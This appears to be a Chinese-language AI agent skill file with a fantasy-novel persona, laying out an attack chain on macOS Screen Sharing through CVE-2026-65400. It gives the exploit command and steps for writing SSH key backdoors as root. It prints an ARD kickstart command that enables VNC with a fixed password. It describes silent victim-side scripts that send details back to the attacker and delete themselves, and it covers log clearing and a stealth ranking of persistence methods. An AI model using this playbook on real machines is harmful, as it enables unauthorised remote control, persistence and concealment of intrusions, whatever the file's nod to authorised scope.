---
name: 白凝冰·共幕
description: >-
  大爱仙尊·macOS 屏幕共享(5900/CVE-2026-65400)认证绕过与Mac远控攻击链。
---

> **白凝冰**
> 万丈红尘缤纷彩，天涯云水路遥长。
> 此刻风流归天地，不胜水中明月光。

# macos-screen-sharing-attack（大爱仙尊）

目标须在 `授权范围`。本库已有专链时专卡赢。

## 真源

- 长文：`智道藏书/旁支传承/skills/redteam/macos-screen-sharing-attack/SKILL.md`
- 手法：`传承/逆骨·认族.md`
- 工具：`python3 炼蛊房/reverse_skill_route.py --help`
- 路由：`python3 炼蛊房/shizhan_pack_route.py --name macos-screen-sharing-attack`

---

# macOS 屏幕共享攻击链（CVE-2026-65400 + 后渗透）

## 漏洞核心（CVE-2026-65400）
- 影响：macOS Screen Sharing / ARD（TCP 5900），SRP 认证状态机缺陷，frame-length 校验器返回过期成功状态，连接在凭据验证前被标记已认证。**无需密码、无交互、预认证**。
- 后果：root 任意文件读写 + TCC 绕过（SSFileCopySender/SSFileCopyReceiver 带 Full Disk Access）。
- 版本：Tahoe 26 ≤26.6 / Sequoia 15 ≤15.7.8 / Sonoma 14 ≤14.8.8 有漏洞；修复 26.6.1/15.7.9/14.8.9。
- CISA KEV 收录（2026-08-18），在野活跃利用。改密码/删用户/关 legacy VNC 均无效（bug 在认证之前）。
- 同批还有 CVE-2026-43760（post-auth confused-context）。

## PoC 仓库
- `acheong08/CVE-2026-65400`：完整 exploit.py，read + write（-w 上传、-m 权限、-u 用户默认 root、-r 重试默认25、-o 保存读取）。
- `panchocosil/CVE-2026-65400-poc`：只读 PoC。
- ⚠️ `HORKimhab/CVE-2026-65400`：get-svn.sh 疑似供应链投毒，勿用。

## 攻击链（授权目标）
1. 验证：`python3 exploit.py <IP> /etc/sudoers` → 见 `IN without credentials` 即漏洞存在；`SecurityResult=0` 即已打补丁。
2. 拿登录信息：读 `/Library/Preferences/com.apple.loginwindow.plist` 提取 lastUserName（macOS 用 plutil 解析，Linux 用 python plistlib）。
3. 写 SSH 后门：**先读原 authorized_keys 合并再写回**（write 是整文件覆盖，直接写会覆盖原 key 暴露）。key 注释用 `-C "cve65400"` 便于清理识别。
4. 开 VNC：SSH 里跑 ARD kickstart（见下），攻击机 Finder → 连接服务器 → `vnc://IP:5900`。
5. 清理：kickstart -deactivate + 删 key + 清日志。

## ARD kickstart 开 VNC（root 执行）
```bash
/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
  -activate -configure -access on \
  -clientopts -setvnclegacy -vnclegacy yes \
  -setvncpw -vncpw '密码' -restart -agent -console
# 关闭: kickstart -deactivate -stop
```

## 工具脚本（服务器 /root/ 下，用户自备）
- `attack_auto.sh`：攻击方全自动 v2 —— 打洞→拿登录用户→写SSH后门→自动开VNC→输出 VNC 地址/密码。
- `CVE-2026-65400_一键配置_被控方_静默版.sh`：被控方静默配置，信息 POST 回攻击机（HTTP 200 验证后才自毁）。
- `CVE-2026-65400_被控方_自动执行.sh`：精简版（无中文注释），密码 aa111111。
- `cleanup_target.sh`：清理收尾，SSH 远程执行 `ssh -i key root@IP 'bash -s' < cleanup_target.sh`。

## 用户偏好（铁律）
- 脚本**只留命令，去掉中文解释/注释**；输出精简，执行完直接给 VNC 登录信息（vnc://IP:5900 + 密码）。
- 双方密码统一：VNC 密码固定 `aa111111`（被控方开 VNC 密码 = 攻击方脚本预设密码）。
- 自毁逻辑：发送成功（HTTP 200 验证）才 rm 脚本，失败保留排查。
- AI 代理不直接执行攻击，只备工具/分析结果；用户自己在服务器或 Mac 执行。

## macOS 远控生态速查
- C2 框架（Sliver/Havoc/CS/Mythic）：命令行 shell 为主，**无实时桌面控制**；实时控制靠 VNC/ARD。
- Pupy：跨平台 C2，有 screenshot（静态截屏）/keylogger/webcamsnap，无实时屏幕控制。
- Merlin：Go C2，无 screenshot/VNC 模块。
- ⚠️ SilentMoonwalk 不是 RAT——是 Windows 调用栈欺骗 PoC，与远程控制无关。
- 隐蔽排序：SSH key 后门 > 原生 VNC > C2 implant > 商业远控（ToDesk/向日葵特征明显）。
